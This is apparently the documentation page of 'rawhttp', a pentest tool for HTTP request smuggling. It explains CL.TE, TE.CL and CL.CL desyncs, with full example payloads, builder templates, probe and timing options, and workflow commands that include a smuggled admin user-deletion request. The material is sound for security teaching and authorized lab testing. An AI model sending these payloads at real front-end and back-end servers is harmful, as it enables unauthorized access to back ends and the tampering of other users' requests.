# rawhttp — HTTP Request Smuggling

Theory, payload anatomy, and how to drive and confirm a desync with rawhttp.

> **Authorization.** Everything here is for hosts you own or are explicitly
> authorized to test — your own lab or the
> [PortSwigger Web Security Academy](https://portswigger.net/web-security/request-smuggling)
> labs. Sending these payloads at systems without authorization is illegal.

---

## Why smuggling is possible

Most real deployments chain an HTTP **front-end** (CDN, load balancer, reverse
proxy) in front of a **back-end** application server, reusing a single TCP
connection to the back-end for many client requests. Both must agree on
exactly where one request ends and the next begins.

HTTP/1.1 gives two ways to state a message body's length:

- **`Content-Length`** — an exact byte count.
- **`Transfer-Encoding: chunked`** — a series of hex-sized chunks ending with
  a `0`-sized chunk.

The spec says if **both** are present, `Transfer-Encoding` wins and
`Content-Length` must be ignored (and duplicate `Content-Length` is invalid).
When the front-end and back-end resolve an **ambiguous** message differently,
they disagree on the boundary. The leftover bytes the back-end didn't consume
get prepended to the **next** client's request on that reused connection —
that prefix is *smuggled*.

The whole game is crafting one request that the two servers frame two
different ways. rawhttp helps by sending your bytes **exactly** — no library
in the middle "helpfully" normalizing duplicate or conflicting length headers
away.

---

## The three techniques

rawhttp generates three classic shapes. In each, **CL** = the server that
honors `Content-Length`, **TE** = the server that honors `Transfer-Encoding`;
the name is `front.back`.

### CL.TE — front-end uses Content-Length, back-end uses Transfer-Encoding

The front-end reads `Content-Length` bytes and forwards them all. The back-end
sees `Transfer-Encoding: chunked`, reads the terminating `0`-chunk, and
**stops early** — leaving the trailing bytes buffered as the start of the next
request.

```
POST / HTTP/1.1
Host: victim
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

- Front-end (CL=13) forwards the whole body: `0\r\n\r\nSMUGGLED`.
- Back-end (TE) sees the `0`-chunk, ends the request there, and treats
  `SMUGGLED` as the beginning of the next request on the connection.

`rawhttp` builder (`build_cl_te`), default `--cl1` =
`len("0\r\n\r\n") + len(smuggled)`:

```
POST {path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: {cl}\r\n
Transfer-Encoding: chunked\r\n\r\n0\r\n\r\n{smuggled}
```

### TE.CL — front-end uses Transfer-Encoding, back-end uses Content-Length

Mirror image. The front-end processes the whole chunked body; the back-end
honors `Content-Length` and reads only that many bytes — just enough to
consume the chunk-size line — leaving the rest as the next request.

```
POST / HTTP/1.1
Host: victim
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

```

- Front-end (TE) reads the `8`-sized chunk `SMUGGLED`, then the `0`-chunk — a
  complete body.
- Back-end (CL=3) reads only `8\r\n` (3 bytes) and stops, so
  `SMUGGLED\r\n0\r\n\r\n` starts the next request.

`rawhttp` builder (`build_te_cl`), default `--cl1` = length of the
`{hex_len}\r\n` line, `hex_len` = hex of `len(smuggled)`:

```
POST {path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: {cl}\r\n
Transfer-Encoding: chunked\r\n\r\n{hex_len}\r\n{smuggled}\r\n0\r\n\r\n
```

> The terminating chunk is the ASCII digit `0` (`0x30`) followed by
> `\r\n\r\n`. (An early rawhttp bug emitted a NUL byte here instead, which
> silently neutered TE.CL — fixed; regression-tested byte-for-byte against
> the reference.)

### CL.CL — two Content-Length headers

Both servers honor `Content-Length`, but the request carries **two** of them.
If the front-end trusts the first and the back-end the second (or vice-versa),
they disagree. rawhttp emits both with the **same, correct** value by default —
the attack only does something once you override one to disagree:

```
POST / HTTP/1.1
Host: victim
Content-Length: 6
Content-Length: 5

smuggledX
```

`rawhttp` builder (`build_cl_cl`); override with `--cl1` / `--cl2`:

```
POST {path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: {cl1}\r\n
Content-Length: {cl2}\r\n\r\n{smuggled}
```

The builders never invent a mismatch for you — both lengths are independently
overridable so the disagreement is always something you chose and can reason
about.

---

## Confirming a desync (`--probe`)

The smuggling request's **own** response usually looks normal — the evidence
is what happens to the **next** request on the connection. `--probe` sends a
plain follow-up immediately after, on the same connection:

```
GET /rawhttp-probe HTTP/1.1
Host: {host}
Connection: close

```

Then rawhttp dumps the **combined** byte stream. Read it for the tells:

- A response that answers something **other** than `/rawhttp-probe` (your
  smuggled prefix got prepended to it).
- An **extra** or **missing** response, or two responses where you expected
  one.
- A `4xx`/`5xx` where the probe alone would succeed.

Firing the pair back-to-back (no wait between) is deliberate — a desync is far
more visible in a fast-fired pair than a politely spaced one, and there is no
reliable protocol-framed moment to wait for in raw mode anyway.

### Timing as a second signal (`--timing`)

Some desyncs leave the back-end **blocking**, waiting for more of a request
that never comes. A suspiciously large **TTFB** (time-to-first-byte) is a
strong hint even when the body looks unremarkable. `--timing` reports it.
(Note: in raw/smuggle mode `total` includes the fixed 2 s idle-timeout wait,
so lean on **TTFB**, not `total`, there.)

---

## Workflow

```sh
# 1. Baseline: what does a normal request to this path look like?
rawhttp http://victim.lab/ --timing

# 2. Try each technique with a probe + timing
rawhttp --smuggle cl.te --target victim.lab:80 --probe --timing
rawhttp --smuggle te.cl --target victim.lab:80 --probe --timing
rawhttp --smuggle cl.cl --target victim.lab:80 --cl1 6 --cl2 5 --probe --timing

# 3. Inspect the exact bytes through Burp
rawhttp --proxy 127.0.0.1:8080 --smuggle cl.te --target victim.lab:80 --probe

# 4. Tune: real path, real vhost, a distinctive smuggled prefix
rawhttp --smuggle te.cl --target victim.lab:80 \
        --path /admin --smuggle-host app.internal \
        --smuggled 'GET /admin/delete?user=carlos HTTP/1.1\r\nX: '
```

For fully hand-crafted payloads beyond the three generators, drop to
[raw mode](USAGE.md#2-raw-mode) with `--raw`/`--raw2`, which sends arbitrary
bytes and a second request on the same connection.

Ready-made reference payloads (byte-for-byte matching PortSwigger's) live in
[`examples/`](../examples/).

---

## Reading the hex dump

Before sending, rawhttp prints a hex+ASCII dump of the exact payload:

```
--- cl.te payload, sending 97 bytes to victim.lab:80 ---
00000000  50 4f 53 54 20 2f 20 48  54 54 50 2f 31 2e 31 0d  |POST / HTTP/1.1.|
...
```

Verify the length-header values and the `\r\n` (`0d 0a`) boundaries are
exactly what you intend — the dump is there so you never have to trust the
tool blind.

---

## References

- PortSwigger — [HTTP request smuggling](https://portswigger.net/web-security/request-smuggling)
  (theory + labs).
- RFC 7230 §3.3.3 — message body length precedence and the ambiguity rules
  this all hinges on.
